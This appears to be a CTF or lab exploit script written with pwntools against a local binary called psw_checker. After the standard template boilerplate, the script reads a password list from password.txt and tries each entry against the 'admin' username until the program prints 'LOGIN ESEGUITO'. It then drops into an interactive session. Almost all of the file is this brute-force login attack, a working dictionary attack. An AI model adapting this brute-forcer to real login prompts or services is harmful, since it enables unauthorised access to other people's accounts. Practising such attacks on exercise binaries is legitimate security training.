#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template psw_checker
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('psw_checker')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
#def psw_saver(passwords):
#    with open("password.txt", "r") as f:
#        lines = f.readlines()
#    for line in lines:
#        password = line.strip()
#        passwords.append(password)

#    print(passwords)

io = start()

def get_passwords():
  passwords = []

  with open('password.txt', 'r') as f:
    for line in f:
      passwords.append(line.strip())
  return passwords

  
passwords = get_passwords()
#print(passwords)
for password in passwords:
    io.sendlineafter(b"username",b"admin" )
    io.sendlineafter(b"password:",password)
    io.recvline()
    output=io.recvline()
    if b"LOGIN ESEGUITO" in output:
        break



io.interactive()



